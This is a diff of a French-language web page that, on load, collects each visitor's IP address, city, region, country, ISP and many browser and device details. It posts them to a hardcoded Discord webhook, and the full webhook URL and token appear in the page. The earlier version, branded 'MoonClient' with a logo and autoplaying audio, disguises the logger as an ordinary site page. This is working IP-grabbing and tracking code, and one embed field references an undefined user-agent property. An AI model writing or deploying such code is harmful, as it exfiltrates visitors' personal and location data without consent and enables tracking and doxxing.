@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>MoonClient</title>
+    <title>Collecte d'Informations Utilisateur</title>
     <style>
         body {
             font-family: Arial, sans-serif;
@@ -14,121 +14,112 @@
             margin: 0;
             background-color: #f4f4f9;
         }
-
         .container {
             text-align: center;
-            max-width: 400px;
+            max-width: 500px;
             padding: 20px;
             background: #fff;
             box-shadow: 0px 0px 10px rgba(0, 0, 0, 0.1);
             border-radius: 8px;
         }
-
-        #logo {
-            width: 100px;
-            margin-bottom: 20px;
-        }
-
         #info {
             margin-top: 20px;
             text-align: left;
-        }
-
-        .error {
-            color: red;
         }
     </style>
 </head>
 <body>
     <div class="container">
-        <img id="logo" src="https://files.catbox.moe/imzkkq.png" alt="Logo du site">
-        <h1>Page d'information</h1>
-        <div id="info">
-            <p><strong>IP :</strong> <span id="ip"></span></p>
-            <p><strong>Navigateurs :</strong> <span id="browser"></span></p>
-            <p><strong>Date et Heure :</strong> <span id="datetime"></span></p>
-            <p><strong>Localisation :</strong> <span id="location"></span></p>
-            <p><strong>Langue :</strong> <span id="language"></span></p>
-            <p><strong>Fuseau Horaire :</strong> <span id="timezone"></span></p>
-            <p><strong>Résolution d'écran :</strong> <span id="screenResolution"></span></p>
-            <p><strong>Type de plateforme :</strong> <span id="platform"></span></p>
-            <p class="error" id="error"></p>
-        </div>
+        <h1>Informations Utilisateur</h1>
+        <p id="status"></p>
+        <div id="info"></div>
     </div>
-    <audio id="audio" src="https://files.catbox.moe/hjmyxn.mp3"></audio> <!-- Chemin vers le fichier audio -->
-    <script>
-        // Jouer le son automatiquement
-        window.onload = () => {
-            const audio = document.getElementById('audio');
-            audio.play().catch(error => {
-                console.error("L'autoplay a été bloqué par le navigateur : ", error);
-            });
-        };
 
+    <script>
         (async () => {
             try {
-                // Récupérer l'IP et les informations géographiques avec ipwhois.app
+                const startTime = performance.now();
+
+                // Récupérer des informations générales
                 const response = await fetch('https://ipwhois.app/json/');
-                if (!response.ok) throw new Error("Erreur lors de la récupération des informations");
                 const data = await response.json();
 
-                // Récupérer les informations du navigateur
-                const userAgent = navigator.userAgent;
-                const browserName = navigator.appName;
-                const browserVersion = navigator.appVersion;
-                const currentDateTime = new Date().toLocaleString();
-
-                // Récupérer des informations supplémentaires
-                const language = navigator.language || navigator.userLanguage;
-                const timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
-                const screenResolution = `${window.screen.width}x${window.screen.height}`;
-                const platform = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent) ? 'Mobile' : 'Desktop';
+                const userInfo = {
+                    ip: data.ip,
+                    location: `${data.city}, ${data.region}, ${data.country}`,
+                    timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+                    language: navigator.language,
+                    additionalLanguages: navigator.languages.join(", "),
+                    screenResolution: `${window.screen.width}x${window.screen.height}`,
+                    windowSize: `${window.innerWidth}x${window.innerHeight}`,
+                    platform: navigator.platform,
+                    onlineStatus: navigator.onLine ? "En ligne" : "Hors ligne",
+                    connectionType: navigator.connection ? navigator.connection.effectiveType : "Inconnue",
+                    colorDepth: `${screen.colorDepth}-bit`,
+                    orientation: screen.orientation ? screen.orientation.type : "Inconnue",
+                    cookiesEnabled: navigator.cookieEnabled ? "Oui" : "Non",
+                    renderEngine: navigator.product,
+                    loadTime: `${(performance.now() - startTime).toFixed(2)} ms`
+                };
 
                 // Afficher les informations sur la page
-                document.getElementById('ip').textContent = data.ip;
-                document.getElementById('browser').textContent = `${browserName} ${browserVersion}`;
-                document.getElementById('datetime').textContent = currentDateTime;
-                document.getElementById('location').textContent = `${data.city}, ${data.region}, ${data.country}`;
-                document.getElementById('language').textContent = language;
-                document.getElementById('timezone').textContent = timezone;
-                document.getElementById('screenResolution').textContent = screenResolution;
-                document.getElementById('platform').textContent = platform;
+                document.getElementById("info").innerHTML = `
+                    <p><strong>IP :</strong> ${userInfo.ip}</p>
+                    <p><strong>Localisation :</strong> ${userInfo.location}</p>
+                    <p><strong>Fuseau Horaire :</strong> ${userInfo.timezone}</p>
+                    <p><strong>Langue :</strong> ${userInfo.language}</p>
+                    <p><strong>Langues supplémentaires :</strong> ${userInfo.additionalLanguages}</p>
+                    <p><strong>Résolution d'écran :</strong> ${userInfo.screenResolution}</p>
+                    <p><strong>Taille de la fenêtre :</strong> ${userInfo.windowSize}</p>
+                    <p><strong>Type de plateforme :</strong> ${userInfo.platform}</p>
+                    <p><strong>Statut en ligne :</strong> ${userInfo.onlineStatus}</p>
+                    <p><strong>Type de connexion :</strong> ${userInfo.connectionType}</p>
+                    <p><strong>Profondeur de couleur :</strong> ${userInfo.colorDepth}</p>
+                    <p><strong>Orientation de l'écran :</strong> ${userInfo.orientation}</p>
+                    <p><strong>Support des cookies :</strong> ${userInfo.cookiesEnabled}</p>
+                    <p><strong>Moteur de rendu :</strong> ${userInfo.renderEngine}</p>
+                    <p><strong>Temps de chargement de la page :</strong> ${userInfo.loadTime}</p>
+                `;
 
-                // Préparer les informations pour l'embed Discord
+                // Préparer l'embed pour Discord
                 const embed = {
                     embeds: [
                         {
-                            title: "Nouvelle IP collectée",
-                            description: "Détails de la connexion",
+                            title: "Informations Utilisateur",
                             color: 3447003,
                             fields: [
-                                { name: "Adresse IP", value: data.ip, inline: true },
-                                { name: "Date et Heure", value: currentDateTime, inline: true },
-                                { name: "Navigateur", value: `${browserName} ${browserVersion}`, inline: true },
-                                { name: "Système d'Exploitation", value: userAgent, inline: false },
-                                { name: "Localisation", value: `${data.city}, ${data.region}, ${data.country}`, inline: true },
-                                { name: "Langue", value: language, inline: true },
-                                { name: "Fuseau Horaire", value: timezone, inline: true },
-                                { name: "Résolution d'écran", value: screenResolution, inline: true },
-                                { name: "Type de plateforme", value: platform, inline: true },
-                                { name: "Fournisseur d'Accès Internet (ISP)", value: data.isp, inline: false }
+                                { name: "Adresse IP", value: userInfo.ip, inline: true },
+                                { name: "Localisation", value: userInfo.location, inline: true },
+                                { name: "Fuseau Horaire", value: userInfo.timezone, inline: true },
+                                { name: "Langue", value: userInfo.language, inline: true },
+                                { name: "Langues supplémentaires", value: userInfo.additionalLanguages, inline: false },
+                                { name: "Résolution d'écran", value: userInfo.screenResolution, inline: true },
+                                { name: "Taille de la fenêtre", value: userInfo.windowSize, inline: true },
+                                { name: "Type de plateforme", value: userInfo.platform, inline: true },
+                                { name: "Statut en ligne", value: userInfo.onlineStatus, inline: true },
+                                { name: "Type de connexion", value: userInfo.connectionType, inline: true },
+                                { name: "Profondeur de couleur", value: userInfo.colorDepth, inline: true },
+                                { name: "Orientation de l'écran", value: userInfo.orientation, inline: true },
+                                { name: "Support des cookies", value: userInfo.cookiesEnabled, inline: true },
+                                { name: "Moteur de rendu", value: userInfo.renderEngine, inline: true },
+                                { name: "Temps de chargement de la page", value: userInfo.loadTime, inline: true },
+                                { name: "User-Agent", value: userInfo.userAgent, inline: false }
                             ]
                         }
                     ]
                 };
 
-                // Envoyer l'embed au webhook Discord
+                // Envoyer les informations au webhook Discord
                 const webhookURL = "https://canary.discord.com/api/webhooks/1302003054790447198/7f_fux6WOnMg2D7V1RtVPxq_560T6tv37O1yFRhySGzUnBLX_U2AT7tHFNqyCVHVSGMb";
                 await fetch(webhookURL, {
                     method: 'POST',
-                    headers: {
-                        'Content-Type': 'application/json'
-                    },
+                    headers: { 'Content-Type': 'application/json' },
                     body: JSON.stringify(embed)
                 });
+
+                document.getElementById("status").textContent = "Informations envoyées avec succès.";
             } catch (error) {
-                // Afficher le message d'erreur dans la page
-                document.getElementById('error').textContent = error.message;
+                document.getElementById("status").textContent = "Erreur lors de l'envoi des informations.";
                 console.error(error);
             }
         })();
